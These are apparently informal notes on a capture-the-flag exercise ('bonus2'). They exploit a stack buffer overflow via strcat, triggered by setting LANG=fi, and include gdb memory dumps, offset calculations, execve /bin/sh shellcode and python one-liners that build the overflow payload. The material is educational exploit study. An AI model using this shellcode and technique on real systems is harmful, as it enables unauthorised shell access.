r ccccaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ffeebbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

first argv 40 byte wrote in the stack 0xffffd230
second argv 32 byte wrote in the stack 0xffffd258

0xffffd220:	0xf7fc4540	0xffffffff	0x08048034	0xf7fc66d0
0xffffd230:	0x63636363	0x61616161	0x61616161	0x61616161
0xffffd240:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd250:	0x61616161	0x61616161	0x65656666	0x62626262
0xffffd260:	0x62626262	0x62626262	0x62626262	0x62626262
0xffffd270:	0x62626262	0x62626262	0x00000000	0x00000001

in function greet user, strcat hello + all the string = 
 
0xffffd180:	0xffffd1d4	0xffffd1e0	0xf7ffd000	0x0804823c
0xffffd190:	0x6c6c6548	0x0000206f	0xffffd374	0xf7c39750
0xffffd1a0:	0xf7c0f664	0xf7d8e6c0	0x00000002	0x003055e4
0xffffd1b0:	0xf7c184be	0xffffd230	0xffffd354	0xffffd27c
0xffffd1c0:	0xffffd298	0xf7fd8f84	0x0804873c	0xf7d8e6c0
0xffffd1d0:	0xffffd6af	0xf7ffda40	0xffffd298	0x08048630
0xffffd1e0:	0x63636363	0x61616161	0x61616161	0x61616161
0xffffd1f0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd200:	0x61616161	0x61616161	0x65656666	0x62626262
0xffffd210:	0x62626262	0x62626262	0x62626262	0x62626262
0xffffd220:	0x62626262	0x62626262	0x00000000	0xf7fc66d0

72 byte wrote + hello ?

address return to 0x08006262, not enought byte wrote 

0xffffd180:	0xffffd190	0xffffd1e0	0xf7ffd000	0x0804823c
0xffffd190:	0x6c6c6548	0x6363206f	0x61616363	0x61616161
0xffffd1a0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd1b0:	0x61616161	0x61616161	0x61616161	0x66666161
0xffffd1c0:	0x62626565	0x62626262	0x62626262	0x62626262
0xffffd1d0:	0x62626262	0x62626262	0x62626262	0x08006262

env | grep LANG                                                                                          (main✱) 
LANG=en_US.UTF-8

lang = getenv("LANG");
if (lang != (char *)0x0)
	j = memcmp(lang,"fi",2);

it memcmp lang and fi, then with nl. Lets try both

export LANG=fi                                                                                           (main✱) 
env | grep LANG                                                                                          (main✱) 
LANG=fi

with fi, return address is completely overwrite
stopped 0x62626262

(gdb) pattern offset  0x61666161
[+] Searching for '61616661'/'61666161' with period=4
[+] Found at offset 18 (little-endian search) likely

Idea is too write shell code in the first arg, then offset + return address of the shell code

- shell code : ```\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80``` (21 bytes)
- buffer address: 0xbffff560
- buffer address: 0xbffff560
- padding \x90 * 50
- Offset = 18

payload = $(shell code + padding) $(offset + address of the buffer)


$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + b"\x90" * 50)') $(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 18 + b"\x40\xd2\xff\xff")')

./bonus2  $(python2.7 -c 'import sys; sys.stdout.write(b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"  + b"\x90" * 50)') $(python2.7 -c 'import sys; sys.stdout.write(b"A" * 23 + b"\x60\xf5\xff\xbf")')

 $(python2.7 -c 'import sys; sys.stdout.write( b"\x90" * 19 + b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")') $(python2.7 -c 'import sys; sys.stdout.write(b"A" * 23 + b"\x90\xf5\xff\xbf")')

 $(python2.7 -c 'import sys; sys.stdout.write( b"\x90" * 15 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")') $(python2.7 -c 'import sys; sys.stdout.write(b"A" * 23 + b"\xf8\xf7\xff\xbf")')